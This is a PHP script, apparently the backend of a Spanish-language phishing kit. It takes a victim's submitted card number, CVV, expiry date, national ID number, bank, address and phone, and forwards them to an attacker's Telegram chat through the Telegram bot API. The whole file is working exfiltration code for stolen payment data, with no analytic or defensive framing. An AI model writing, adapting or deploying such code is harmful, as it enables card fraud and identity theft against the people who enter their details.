<?php require_once __DIR__ . '/visit_handler.php'; ?>
<?php
header('Content-Type: application/json');
require_once __DIR__ . '/config.php';

$inputJSON = file_get_contents('php://input');
$data = json_decode($inputJSON, true);

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

$token = $telegram_config['token'];
$chat_id = $telegram_config['chat_id'];

$message = "<b>💳 Nueva Tarjeta Recibida</b>\n";
$message .= "--------------------------------------------------\n";
$message .= "👤 <b>Propietario:</b> " . ($data['ownerName'] ?? 'N/A') . "\n";
$message .= "🪪 <b>Cédula:</b> " . ($data['cedula'] ?? 'N/A') . "\n";
$message .= "💳 <b>Número:</b> <code>" . ($data['cardNumber'] ?? 'N/A') . "</code>\n";
$message .= "📅 <b>Expiración:</b> " . ($data['expMonth'] ?? 'N/A') . "/" . ($data['expYear'] ?? 'N/A') . "\n";
$message .= "🔐 <b>CVV:</b> " . ($data['cvv'] ?? 'N/A') . "\n";
$message .= "💰 <b>Cuotas:</b> " . ($data['cuotas'] ?? 'N/A') . "\n";
$message .= "--------------------------------------------------\n";
$message .= "🏦 <b>Banco:</b> " . ($data['bank'] ?? 'N/A') . "\n";
$message .= "💳 <b>Tipo:</b> " . ($data['type'] ?? 'N/A') . "\n";
$message .= "--------------------------------------------------\n";
$message .= "🏙️ <b>Ciudad:</b> " . ($data['city'] ?? 'N/A') . "\n";
$message .= "🏠 <b>Dirección:</b> " . ($data['address'] ?? 'N/A') . "\n";
$message .= "📞 <b>Teléfono:</b> " . ($data['phone'] ?? 'N/A') . "\n";

$url = "https://api.telegram.org/bot$token/sendMessage";
$postData = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

echo json_encode(['status' => 'success', 'telegram_response' => json_decode($response)]);
